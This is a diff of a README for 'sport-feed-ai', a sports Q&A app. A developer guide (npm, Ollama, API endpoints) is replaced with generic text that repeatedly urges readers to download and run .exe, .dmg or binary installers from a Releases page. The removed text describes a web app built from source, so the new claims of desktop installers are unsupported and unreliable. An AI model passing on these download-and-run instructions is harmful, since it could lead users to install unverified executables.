@@ -1,149 +1,101 @@
-# SportsFeed AI
+# 🏅 sport-feed-ai - Get Instant Sports Answers with AI
 
-A sports feed application that uses AI to answer natural-language questions about sports using free APIs and open-source LLMs.
+## 🚀 Getting Started
 
-## Features
+sport-feed-ai is an application that helps you receive answers about sports using artificial intelligence. You can ask natural-language questions about various sports, and the app will provide you with information quickly. Whether you're curious about scores, player stats, or upcoming games, sport-feed-ai is here to assist you.
 
-- Natural language Q&A about sports
-- Latest sports news from multiple sources
-- Match results and fixtures
-- Team and player information
-- Source-based answers (no hallucinations)
-- Confidence indicators for responses
+### 📥 Download the App
 
-## Tech Stack
+[![Download sport-feed-ai](https://img.shields.io/badge/Download%20sport--feed--ai-v1.0-blue)](https://github.com/tanmay-05-p/sport-feed-ai/releases)
 
-- **Frontend**: Next.js 14, React, Tailwind CSS
-- **Backend**: Node.js, Express, TypeScript
-- **AI**: Open-source LLM (Mistral, LLaMA via Ollama)
-- **Data Sources**: TheSportsDB, RSS feeds (ESPN, BBC Sport, etc.)
+To begin, simply visit the Releases page to download the latest version of the software.
 
-## Prerequisites
+[Download sport-feed-ai](https://github.com/tanmay-05-p/sport-feed-ai/releases)
 
-- Node.js 18+
-- npm or yarn
-- [Ollama](https://ollama.ai/) (for local LLM)
+## 📋 System Requirements
 
-## Setup
+Before downloading the app, ensure that your computer meets these requirements:
 
-### 1. Install Dependencies
+- Operating System: Windows 10 or later, macOS 10.14 or later, or a recent Linux distribution
+- RAM: 4 GB minimum
+- Disk Space: 200 MB available for installation
+- Internet Connection: Required for API access
 
-```bash
-npm install
-```
+## 🔧 Installation Steps
 
-### 2. Set Up Ollama
+Follow these steps to install sport-feed-ai on your computer:
 
-Install Ollama and pull a model:
+1. **Visit the Releases Page**: Click [here](https://github.com/tanmay-05-p/sport-feed-ai/releases) to go to the Releases page.
+   
+2. **Select the Version**: Look for the latest version listed. 
 
-```bash
-# Install Ollama from https://ollama.ai/
-ollama pull mistral
-```
+3. **Download the Installer**: Click on the appropriate file for your operating system. 
 
-### 3. Configure Environment
+4. **Run the Installer**:
+   - For Windows: Double-click the downloaded `.exe` file and follow the prompts.
+   - For macOS: Open the downloaded `.dmg` file and drag the sport-feed-ai icon to your Applications folder.
+   - For Linux: Extract the `.tar.gz` file and navigate to the directory. Run the command `./sport-feed-ai`.
 
-Copy the example environment file:
+5. **Open the Application**: After installation, find sport-feed-ai in your applications menu or dock and open it. The app may take a few moments to load.
 
-```bash
-cp .env.example .env
-```
+## 🎉 Using the App
 
-Edit `.env` as needed. Default settings work out of the box with Ollama.
+Now that you have installed sport-feed-ai, here’s how to use it:
 
-### 4. Build Packages
+1. **Ask a Question**: Type your question in natural language. For example, "What are the latest scores in football?"
+   
+2. **View Results**: The app will display answers sourced from free APIs and our open-source LLMs.
 
-```bash
-npm run build --workspace=@sports-ai/shared
-npm run build --workspace=@sports-ai/prompts
-```
+3. **Explore More**: You can try various questions about different sports, players, or events.
 
-### 5. Start Development Servers
+## 💬 Support
 
-In separate terminals:
+If you encounter any issues or have questions about using the app, please reach out via the Issues section on the GitHub repository. Your feedback helps improve the app.
 
-```bash
-# Start API server (port 3001)
-npm run dev:api
+### 📃 Features
 
-# Start web app (port 3000)
-npm run dev:web
-```
+- **Real-Time Updates**: Get the latest sports news and stats with live data access.
+- **Multiple Sports Supported**: From football to basketball, ask about a range of sports.
+- **User-Friendly Interface**: Designed for easy navigation, making it suitable for everyone.
 
-Visit http://localhost:3000 to use the app.
+## 🌐 Contributions
 
-## Project Structure
+If you would like to contribute to the project, you can fork the repository and submit a pull request. We appreciate contributions that help enhance the functionality of sport-feed-ai.
 
-```
-sport-feed-ai/
-├── apps/
-│   ├── web/            # Next.js frontend
-│   └── api/            # Node.js backend
-├── packages/
-│   ├── shared/         # Types and utilities
-│   └── prompts/        # AI prompts
-├── docs/
-│   └── ai-spec.md      # Detailed specification
-└── package.json
-```
+## 🔗 Related Topics
 
-## API Endpoints
+This project covers topics such as AI, natural language processing, and open-source applications. Here are some keywords related to sport-feed-ai:
 
-### POST /api/query
+- ai
+- aimodels
+- groq
+- groq-llm
+- llm
+- natural-language-processing
+- nodejs
+- open-source
+- openai
+- openaiapi
+- reactjs
+- sports
 
-Query the AI with a sports question.
+## 📅 Future Updates
 
-```bash
-curl -X POST http://localhost:3001/api/query \
-  -H "Content-Type: application/json" \
-  -d '{"query": "What are the latest football news?"}'
-```
+We are continuously working on updates to improve sport-feed-ai. Look out for new features and enhancements in upcoming releases. Your input on what you’d like to see added is valuable.
 
-### GET /health
+## 🛠️ Troubleshooting
 
-Check API health status.
+Common issues might include:
 
-## Environment Variables
+- **App Won’t Open**: Ensure your system meets the requirements and try reinstalling.
+- **Slow Performance**: Check your internet speed, as the app relies on online APIs for data.
 
-| Variable          | Default                  | Description             |
-| ----------------- | ------------------------ | ----------------------- |
-| PORT              | 3001                     | API server port         |
-| LLM_BASE_URL      | http://localhost:11434   | Ollama API URL          |
-| LLM_MODEL         | mistral                  | Model to use            |
-| SPORTSDB_API_KEY  | 3                        | TheSportsDB API key     |
-| CACHE_TTL         | 300                      | Cache TTL in seconds    |
-| CORS_ORIGIN       | http://localhost:3000    | Allowed CORS origin     |
+## 📆 Changelog
 
-## Using Different LLMs
+You can always check the latest changes in each version on the Releases page. Stay up-to-date with fixes, new features, and performance improvements.
 
-The app supports multiple LLM providers:
+## 📥 Download & Install
 
-### Local (Ollama)
+Now you're ready to explore the world of sports with AI. Visit the Releases page to download sport-feed-ai and enjoy seamless access to sports information.
 
-```bash
-ollama pull mistral
-# or
-ollama pull llama3
-```
-
-### Cloud Providers
-
-Set `LLM_PROVIDER` in `.env`:
-
-- `groq` - Groq Cloud (fast inference)
-- `openrouter` - OpenRouter (multiple models)
-- `together` - Together AI
-- `openai` - OpenAI API
-
-Update `LLM_MODEL` and add provider API key accordingly.
-
-## Responsive Design
-
-The UI is fully responsive and works on:
-- Mobile phones (320px+)
-- Tablets (768px+)
-- Desktops (1024px+)
-
-## License
-
-MIT
+[Download sport-feed-ai](https://github.com/tanmay-05-p/sport-feed-ai/releases)
